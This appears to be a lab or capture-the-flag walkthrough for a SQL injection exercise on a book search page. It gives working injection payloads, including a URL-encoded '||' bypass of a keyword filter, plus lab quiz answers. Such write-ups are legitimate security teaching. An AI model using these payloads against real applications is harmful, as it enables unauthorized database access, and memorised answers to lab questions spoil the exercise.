# Find the book where `book ID = 6`

### Step 1 — Open the encoding lab

Open:

```
http://10.49.128.101/encoding/
```

The lab's search functionality is handled by:

```
search_books.php
```

Your supplied material identifies this application and its endpoint.

### Step 2 — Understand the normal query

The PHP code constructs:

```sql
SELECT * FROM books WHERE book_name = '$book_name'
```

So the application is vulnerable because the user-controlled `book_name` is directly concatenated into SQL.

### Step 3 — Test the normal search

Search for:

```
Intro to PHP
```

You should get the normal matching book.

<img width="1140" height="737" alt="Screenshot 2026-08-17 at 4 05 10 PM" src="https://github.com/user-attachments/assets/5e5340d8-4235-40bc-8218-2db1c70831db" />


### Step 4 — Try the invalid SQL input

try:

```
Intro to PHP'
```

The application should produce an SQL error.
Look at the error message.

You should see something similar to:

```
Error: ... (Error Code: 1064)
```

Therefore:

**Question 1 answer: `1064`**


<img width="1142" height="735" alt="Screenshot 2026-08-17 at 4 06 04 PM" src="https://github.com/user-attachments/assets/3b20207d-5f39-4954-bc75-9045b26dfc23" />


Try again below command: 

```
Intro to PHP' OR 1=1
```

<img width="1138" height="697" alt="Screenshot 2026-08-17 at 4 07 39 PM" src="https://github.com/user-attachments/assets/a85623c6-22c9-4e7a-9496-c43482ec1f78" />


---

## Step 5 — Bypass the filter

The application removes:

```
OR
or
AND
and
UNION
SELECT
```

using `str_replace()`.

Therefore, a direct payload containing `OR` gets modified before reaching the SQL query.

The lab's bypass uses the SQL `||` operator instead of the filtered `OR`.

The encoded payload given in your material is:

```
1%27%20||%201=1%20--+
```

The important pieces are:

```
%27  → '
%20  → space
||   → SQL OR operator
%3D  → =
%2D  → -
+    → space
```

<img width="1140" height="736" alt="Screenshot 2026-08-17 at 4 15 29 PM" src="https://github.com/user-attachments/assets/41d8b0a7-5565-403d-a3a3-008357e39840" />



### Step 6 — Use the encoded payload

As below:

```
search_books.php?book_name=1%27%20||%201=1%20--+

or

http://10.49.128.101/encoding/search_books.php?book_name=1%27%20||%201=1%20--+
```

The server decodes the URL-encoded characters before constructing the SQL query.

The resulting SQL is conceptually similar to:

```sql
SELECT * FROM books
WHERE book_name = 'Intro to PHP' || 1=1 -- '
```

Because:

```
1=1
```

is always true, the query can return all records.

<img width="1141" height="735" alt="Screenshot 2026-08-17 at 4 25 44 PM" src="https://github.com/user-attachments/assets/85a1fbaa-0e85-4b65-9522-c6f524000033" />


---

# 3. Find ID 6

Once the injection returns the complete list of books, inspect the results.

You should see something similar to:

<img width="1141" height="735" alt="Screenshot 2026-08-17 at 4 23 55 PM" src="https://github.com/user-attachments/assets/31e3ca27-7734-4692-90a2-e10ed2d81b49" />


Find:

```
Book ID = 6
```

Then copy the corresponding **Book Name**.
